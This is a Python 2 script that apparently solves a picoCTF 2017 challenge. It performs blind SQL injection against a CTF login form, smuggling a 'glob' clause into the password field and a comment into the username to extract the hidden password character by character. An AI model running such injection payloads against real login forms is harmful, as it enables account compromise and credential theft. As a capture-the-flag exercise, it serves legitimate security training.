import urllib

url = 'http://shell2017.picoctf.com:40788'
#ps = 'not_all_errors_should_be_shown_faa____e______eebb_d___b_e__f_f'
ps = 'not_all_errors_should_be_shown_faa'
chars = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}=+- ?"
while True:
   for c in chars:
      pswd = 't\' or pass glob \'' + ps + c + '*\' --'
#      pswd = ps + c
      params = urllib.urlencode({'username':'admin\' --', 'password':pswd})
      while True:
         try:
            f = urllib.urlopen(url, params)
         except:
            pass
         else:
            break
      if "Incorrect Password" not in f.read():
         ps += c
         print ps
         break
      if c == '-':
         print "Nothing candidates"
         #ps += '_'
         #print ps
   if len(ps) == 63:
      break
print "flag{" + ps + "}"
